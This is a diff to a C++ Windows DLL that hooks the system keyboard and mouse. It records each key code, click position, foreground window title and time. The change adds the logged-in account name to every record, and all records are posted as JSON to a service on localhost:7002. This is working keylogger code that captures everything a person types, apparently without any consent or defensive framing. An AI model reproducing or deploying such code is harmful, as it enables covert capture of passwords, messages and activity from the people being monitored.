@@ -5,6 +5,7 @@
 #include <ctime>
 #include <string>
 #include <nlohmann/json.hpp>
+#include <Lmcons.h>
 
 using namespace nlohmann;
 using namespace std;
@@ -34,12 +35,23 @@ EXPORT void CALLBACK UnKeyBoardHook(void)
 	UnhookWindowsHookEx(hKeyboardHook);
 }
 
-char* now(const char* format = "%c")
+string now(const char* format = "%c")
 {
 	std::time_t t = std::time(0);
 	char cstr[128];
 	std::strftime(cstr, sizeof(cstr), format, std::localtime(&t));
-	return cstr;
+	return string(cstr);
+}
+
+string account_name()
+{
+	wchar_t buffer[UNLEN + 1];
+	DWORD len = UNLEN + 1;
+	GetUserName(buffer, &len);
+	char ch[UNLEN + 1];
+	constexpr char def_char = ' ';
+	WideCharToMultiByte(CP_ACP, 0, buffer, -1, ch, 260, &def_char, nullptr);
+	return string(ch);
 }
 
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
@@ -58,14 +70,15 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 		GetWindowTextA(currentWindowHWND, title, 100);
 
 		json j;
+		j["accountName"] = account_name();
 		j["time"] = string(now("%I:%M:%S"));
 		j["program"] = string(title);
 		j["keyCode"] = std::to_string(p->vkCode);
 
 		PostAsync(
-			Url{"https://localhost:7002/keyboard"},
-			Body{j.dump()},
-			Header{{"Content-Type", "application/json"}});
+			Url{ "https://localhost:7002/keyboard" },
+			Body{ j.dump() },
+			Header{ {"Content-Type", "application/json"} });
 
 		return CallNextHookEx(nullptr, code, wParam, lParam);
 	}
@@ -86,36 +99,31 @@ LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam)
 		char title[100];
 		GetWindowTextA(currentWindowHWND, title, 100);
 
-		switch (wParam)
+		if (wParam == WM_LBUTTONDOWN)
 		{
-		case WM_LBUTTONDOWN:
-			j["time"] = string(now("%I:%M:%S"));
-			j["program"] = string(title);
-			j["x"] = std::to_string(p->pt.x);
-			j["y"] = std::to_string(p->pt.y);
 			j["clickSide"] = "left";
-
-			PostAsync(
-				Url{"https://localhost:7002/mouse"},
-				Body{j.dump()},
-				Header{{"Content-Type", "application/json"}});
-			break;
-
-		case WM_RBUTTONDOWN:
-			j["time"] = string(now("%I:%M:%S"));
-			j["program"] = string(title);
-			j["x"] = std::to_string(p->pt.x);
-			j["y"] = std::to_string(p->pt.y);
-			j["clickSide"] = "right";
-
-			PostAsync(
-				Url{"https://localhost:7002/mouse"},
-				Body{j.dump()},
-				Header{{"Content-Type", "application/json"}});
-			break;
 		}
-		return CallNextHookEx(nullptr, code, wParam, lParam);
+		else if (wParam == WM_RBUTTONDOWN)
+		{
+			j["clickSide"] = "right";
+		}
+		else
+		{
+			return CallNextHookEx(nullptr, code, wParam, lParam);
+		}
+
+		j["accountName"] = account_name();
+		j["time"] = string(now("%I:%M:%S"));
+		j["program"] = string(title);
+		j["x"] = std::to_string(p->pt.x);
+		j["y"] = std::to_string(p->pt.y);
+
+		PostAsync(
+			Url{ "https://localhost:7002/mouse" },
+			Body{ j.dump() },
+			Header{ {"Content-Type", "application/json"} });
 	}
+	return CallNextHookEx(nullptr, code, wParam, lParam);
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
